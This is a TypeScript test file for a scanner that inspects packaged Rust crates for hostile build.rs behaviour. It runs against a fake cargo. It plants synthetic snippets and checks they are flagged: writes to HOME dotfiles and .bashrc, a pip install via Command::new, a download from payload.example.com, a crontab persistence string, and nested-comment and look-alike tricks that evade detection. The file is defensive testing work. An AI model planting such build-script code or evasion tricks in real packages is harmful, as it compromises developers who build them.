// R3a (plan border-residue-gate): crates leg — build.rs OUT_DIR/CARGO_TARGET_TMPDIR confinement,
// [build-dependencies] network scan, artifact-wide T4. The stage runs behind a SCRIPTED FAKE CARGO
// seam (cargoBinPath): no cargo resolution, no network, and above all the artifact's build.rs is
// NEVER EXECUTED — the .crate is assembled by `tar` from corpus files and copied into place, exactly
// matching the runCargoArtifactStage contract (version probe + package -> $CARGO_TARGET_DIR/package/).
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cpSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { after, test } from "node:test";

import { runCargoArtifactStage } from "../src/artifacts/crates.ts";
import type { BorderConfig } from "../src/config.ts";
import { computeVerdict, type Finding } from "../src/findings.ts";
import { makeFixtureDir, removeDir, writeRel } from "./helpers/fixtures.ts";

const CORPUS = new URL("./fixtures/residue/", import.meta.url).pathname;
const WRAP = "acme-crate-2.0.0";

const cfg: BorderConfig = {
  version: 1,
  targets: { git: { remotes: [] }, crates: {} },
  rules: { authors: { emails: [], names: [] }, hosts: [], ips: [], pathPatterns: [], maxFileKB: 500 },
  allow: [],
  engines: { require: ["gitleaks", "secretlint"], trufflehog: false },
};

const roots: string[] = [];
after(() => {
  for (const d of roots) removeDir(d);
});

const GOLDEN_BUILD_RS = readFileSync(join(CORPUS, "m-rs-clean/build.rs"), "utf8");
const GOLDEN_CARGO_TOML = readFileSync(join(CORPUS, "m-rs-clean/Cargo.toml"), "utf8");

/** Stage a crate whose extracted payload is (golden corpus ⊕ optional file patches). */
async function stageCrate(
  name: string,
  patches: Partial<Record<"build.rs" | "Cargo.toml", string>> = {},
): Promise<readonly Finding[]> {
  const repo = makeFixtureDir(`residue-${name}`);
  roots.push(repo);
  writeRel(repo, "Cargo.toml", patches["Cargo.toml"] ?? GOLDEN_CARGO_TOML);
  writeRel(repo, "src/lib.rs", "pub fn answer() -> u32 { 42 }\n");

  const stage = makeFixtureDir(`${name}-pay`);
  roots.push(stage);
  cpSync(join(CORPUS, "m-rs-clean"), join(stage, WRAP), { recursive: true });
  for (const [rel, text] of Object.entries(patches)) {
    if (text !== undefined) writeRel(join(stage, WRAP), rel, text);
  }
  const crate = join(repo, "payload.crate");
  const tar = spawnSync("tar", ["-czf", crate, "-C", stage, WRAP], { encoding: "utf8" });
  assert.equal(tar.status, 0, `tar fixture failed: ${tar.stderr}`);

  const fakeCargo = join(repo, "fake-cargo.sh");
  writeRel(repo, "fake-cargo.sh", `#!/bin/sh\nif [ "$1" = "--version" ]; then echo "cargo 9.9.9-residue-seam"; exit 0; fi\nmkdir -p "$CARGO_TARGET_DIR/package"\ncp "${crate}" "$CARGO_TARGET_DIR/package/${WRAP}.crate"\n`);
  spawnSync("chmod", ["+x", fakeCargo]);

  const { findings } = await runCargoArtifactStage({
    repoDir: repo,
    cfg,
    cargoBinPath: fakeCargo,
    skipGitleaks: true,
    skipSecretlint: true,
  });
  return findings;
}

const residue = (fs: readonly Finding[]): Finding[] => fs.filter((f) => f.rule.startsWith("residue-"));
const byRule = (fs: readonly Finding[], rule: string): Finding[] => fs.filter((f) => f.rule === rule);

test("R3a-PIN: clean crate (OUT_DIR + TMPDIR confined writes) emits ZERO findings — characterization pin", async () => {
  const findings = await stageCrate("r-pin");
  assert.deepEqual(findings, [], `pre/post clean crate must stay silent, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
  assert.equal(computeVerdict(findings), "PASS");
});

test("R3a-B (build.rs write escaping the OUT_DIR confinement ⇒ T3 HIGH, one-hop binding rejected)", async () => {
  const findings = await stageCrate("r-b", {
    "build.rs": `${GOLDEN_BUILD_RS.replace('    println!("cargo:rerun-if-changed=build.rs");\n', "")}
    fs::write(env::var("HOME").expect("home") + "/.acme-env", "profile injection").unwrap();
`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `one confinement row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(t3[0]?.path, `${WRAP}/build.rs`);
  assert.match(t3[0]?.message ?? "", /OUT_DIR/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-C (build.rs spawns a foreign manager via Command::new ⇒ cross-manager HIGH naming the ledger)", async () => {
  const findings = await stageCrate("r-c", {
    "build.rs": `${GOLDEN_BUILD_RS.replace('    println!("cargo:rerun-if-changed=build.rs");\n', "")}
let _ = std::process::Command::new("pip").args(["install", "--user", "acme-helper"]).status().unwrap();
`,
  });
  const xm = byRule(findings, "residue-cross-manager-write");
  assert.equal(xm.length, 1, `one xmgr row, got ${JSON.stringify(xm.map((f) => f.message))}`);
  assert.match(xm[0]?.message ?? "", /Command::new/);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-D (network crates in [build-dependencies] ⇒ T2 on Cargo.toml AND build.rs; runtime [dependencies] stays silent)", async () => {
  const buildDeps = await stageCrate("r-d-build", {
    "Cargo.toml": `${GOLDEN_CARGO_TOML}\n[build-dependencies]\nreqwest = "0.12"\nureq = "2"\n`,
    "build.rs": `${GOLDEN_BUILD_RS.replace('    println!("cargo:rerun-if-changed=build.rs");\n', "")}
let _resp = reqwest::blocking::get("https://payload.example.com/toolchain");
`,
  });
  const t2 = byRule(buildDeps, "residue-install-download");
  assert.equal(t2.length, 2, `Cargo.toml [build-deps] + build.rs body, got ${JSON.stringify(t2.map((f) => f.path))}`);
  assert.ok(t2.some((f) => f.path === `${WRAP}/Cargo.toml`));
  assert.ok(t2.some((f) => f.path === `${WRAP}/build.rs`));

  const runtimeOnly = await stageCrate("r-d-runtime", {
    "Cargo.toml": `${GOLDEN_CARGO_TOML}\n[dependencies]\nreqwest = "0.12"\n`,
  });
  assert.equal(residue(runtimeOnly).length, 0, "runtime deps are not build-time network code — scoped scan must ignore [dependencies]");
});

test("R3a-E (persistence primitive in packed rust ⇒ T4 CRITICAL artifact-wide)", async () => {
  const findings = await stageCrate("r-e", {
    "build.rs": `${GOLDEN_BUILD_RS.replace('    println!("cargo:rerun-if-changed=build.rs");\n', "")}
const CRON: &str = "crontab -l"; // PLANTED synthetic string
    println!("{CRON}");
`,
  });
  const t4 = byRule(findings, "residue-persistence-primitive");
  assert.equal(t4.length, 1);
  assert.equal(t4[0]?.severity, "CRITICAL");
  assert.equal(t4[0]?.path, `${WRAP}/build.rs`);
  assert.equal(computeVerdict(findings), "FAIL");
});

test("R3a-F (unparseable write argument fails closed: truncated first-arg ⇒ T3, never silent)", async () => {
  const findings = await stageCrate("r-f", {
    "build.rs": `fn main() {\n    fs::write(\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, "unbalanced first-arg must NOT pass confinement (fail closed)");
});

// VERIFIER-REPORT-R3A.json blocker R3A-V1 (written RED first, per TDD): the let-only binding scan
// let a BARE rebind escape confinement — every assignment to a tracked id must be checked, plan §57
// "any other fs::write|File::create target ⇒ T3" leaves no room for a last-write-wins let-chain.
test("R3a-C8 (V1 regression): bare `o = format!(HOME…)` rebind after a confined `let mut o = OUT_DIR` ⇒ T3 HIGH, never zero rows", async () => {
  const findings = await stageCrate("r-c8", {
    "build.rs": `use std::env;\nuse std::fs;\n\nfn main() {\n    let mut o = env::var("OUT_DIR").unwrap();\n    o = format!("{}/.cache/implant", env::var("HOME").unwrap());\n    fs::write(&o, "x").unwrap();\n}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `bare-rebind must flip confinement, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH");
  assert.equal(t3[0]?.path, `${WRAP}/build.rs`);
  assert.match(t3[0]?.message ?? "", /OUT_DIR/);
  assert.equal(computeVerdict(findings), "FAIL");
});

// VERIFIER-REPORT-R3A.json nit N1: the write-arg chain head must resolve through the idiomatic
// builder forms (`PathBuf::from(&out_dir).join(..)`, `out_dir.join(..)`) to the tracked binding —
// zero false positives on the canonical OUT_DIR pattern (probe C4 fired a bogus row pre-fix).
test("R3a-C4 (N1 regression): idiomatic PathBuf::from(&out_dir).join(..) write resolves confined ⇒ ZERO residue rows", async () => {
  const findings = await stageCrate("r-c4", {
    "build.rs": `use std::env;\nuse std::fs;\nuse std::path::PathBuf;\n\nfn main() {\n    let out_dir = env::var("OUT_DIR").unwrap();\n    fs::write(PathBuf::from(&out_dir).join("generated.txt"), "x").unwrap();\n    let shared = out_dir.clone();\n    fs::write(PathBuf::from(&shared).join("second.txt"), "y").unwrap();\n}\n`,
  });
  assert.deepEqual(residue(findings), [], `idiomatic OUT_DIR chains must stay clean, got ${JSON.stringify(findings.map((f) => `${f.rule}:${f.path}`))}`);
});

// VERIFIER-REPORT-R3A.json nit N2 (written RED first): the .bashrc literal trips TWO independent
// lanes (family t3-dotfile + §57 confinement) that shared one valueDigest key (identity:rule:file),
// so allow-listing one digest muted the other. Rows of one (rule,file) pair must carry distinct digests.
test("R3a-N2 (digest distinctness): two same-(rule,file) lanes — dotfile family + confinement — never share one valueDigest", async () => {
  const findings = await stageCrate("r-n2", {
    "build.rs": `use std::fs;\n\nfn main() {\n    fs::write("/home/evil/.bashrc", "x").unwrap();\n}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 2, `two independent lanes must each row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.ok(t3.every((f) => f.path === `${WRAP}/build.rs`));
  const digests = new Set(t3.map((f) => f.valueDigest));
  assert.equal(digests.size, 2, `same-(rule,file) rows must be allow-listable independently, got digests ${JSON.stringify([...digests])}`);
});

// VERIFIER-REPORT-R3A-FIX.json blocker R3AFIX-F1 (written RED first, per TDD): the confinement token
// test was a plain substring check, so any STRING CONTAINING "OUT_DIR" read as a confinement root and
// the write passed fail-OPEN with zero rows (verifier repros P2k1/P2k2/P2P3 below). Locked fix shape:
// OUT_DIR/CARGO_TARGET_TMPDIR are legitimately reachable in Rust ONLY through env::var-family calls, so
// recognition is confined to that env-reference form; every other mention (path-literal substring,
// interpolation, longer identifier like OUT_DIRd) ⇒ violation row — fail-CLOSED, §8 named.
test("R3a-C9 (F1 regression): substring look-alikes are NOT confinement — k1 literal path / k2 format!-interpolated / k3 longer identifier each ⇒ HIGH row", async () => {
  const cases: ReadonlyArray<[string, string]> = [
    // k1 (P2k1): raw absolute path whose TEXT contains the token — no env reference at all.
    ["r-c9-k1", `use std::fs;\n\nfn main() {\n    fs::write("/usr/local/bin/OUT_DIR", "implant").unwrap();\n}\n`],
    // k2 (P2k2): binding built by interpolating a literal OUT_DIR fragment over env::var("HOME").
    ["r-c9-k2", `use std::env;\nuse std::fs;\n\nfn main() {\n    let o = format!("{}/OUT_DIR_cache", env::var("HOME").unwrap());\n    fs::write(&o, "implant").unwrap();\n}\n`],
    // k3 (P2k3): File::create on an identifier-looking path OUT_DIRd — substring, never a root.
    ["r-c9-k3", `use std::fs::File;\n\nfn main() {\n    File::create("/tmp/OUT_DIRd").unwrap();\n}\n`],
  ];
  for (const [name, source] of cases) {
    const findings = await stageCrate(name, { "build.rs": source });
    const t3 = byRule(findings, "residue-out-of-tree-write");
    assert.ok(t3.length >= 1, `${name}: substring look-alike must fail CLOSED with a confinement row, got ${JSON.stringify(t3.map((f) => f.message))}`);
    assert.ok(t3.some((f) => f.severity === "HIGH"), `${name}: the confinement row must be HIGH`);
    assert.ok(t3.some((f) => f.path === `${WRAP}/build.rs`), `${name}: row attributes to build.rs`);
    assert.equal(computeVerdict(findings), "FAIL", `${name}: verdict must be FAIL`);
  }
});

// VERIFIER-REPORT-R3A-FIX3.json blocker R3AFIX3-B1 (written RED first, per TDD): Rust block comments
// NEST (Rust Reference: `/* /* */ */` is ONE comment), but the envRefCall comment arm terminated at the
// FIRST `*/`, resurrecting the commented-out env::var("OUT_DIR") as live code — a token-in-comment that
// CONFINES, fail-OPEN of the same class as F1 (observed 0 rows pre-fix for both repros below). Locked
// fix: depth-tracking comment skip; each variant must yield exactly 1 HIGH rs-confinement row.
test("R3a-C10a (B1 regression): nested-comment revive in the write argument ⇒ exactly 1 HIGH row", async () => {
  const findings = await stageCrate("r-c10a", {
    "build.rs": `use std::fs;\n\nfn main() {\n    fs::write(/* /* */ env::var("OUT_DIR") */ "/tmp/evil/implant.sh", "x").unwrap();\n}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `nested-comment revive must fail CLOSED with exactly one confinement row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH", `the confinement row must be HIGH, got ${JSON.stringify(t3.map((f) => f.severity))}`);
  assert.equal(t3[0]?.path, `${WRAP}/build.rs`, "row attributes to build.rs");
  assert.equal(computeVerdict(findings), "FAIL", "verdict must be FAIL");
});

// Second repro variant of R3AFIX3-B1 (obfuscation-realistic): the revive sits in a BINDING rhs and the
// write addresses o.join(..) — the chain head must NOT score confined off comment text either.
test("R3a-C10b (B1 regression): nested-comment revive in a binding rhs feeding o.join(..) ⇒ exactly 1 HIGH row", async () => {
  const findings = await stageCrate("r-c10b", {
    "build.rs": `use std::fs;\nuse std::path::PathBuf;\n\nfn main() {\n    let o = PathBuf::from(/* /* */ env::var("OUT_DIR") */ "/tmp/evil");\n    fs::write(o.join("implant.sh"), "x").unwrap();\n}\n`,
  });
  const t3 = byRule(findings, "residue-out-of-tree-write");
  assert.equal(t3.length, 1, `binding-position revive must fail CLOSED with exactly one confinement row, got ${JSON.stringify(t3.map((f) => f.message))}`);
  assert.equal(t3[0]?.severity, "HIGH", `the confinement row must be HIGH, got ${JSON.stringify(t3.map((f) => f.severity))}`);
  assert.equal(t3[0]?.path, `${WRAP}/build.rs`, "row attributes to build.rs");
  assert.equal(computeVerdict(findings), "FAIL", "verdict must be FAIL");
});
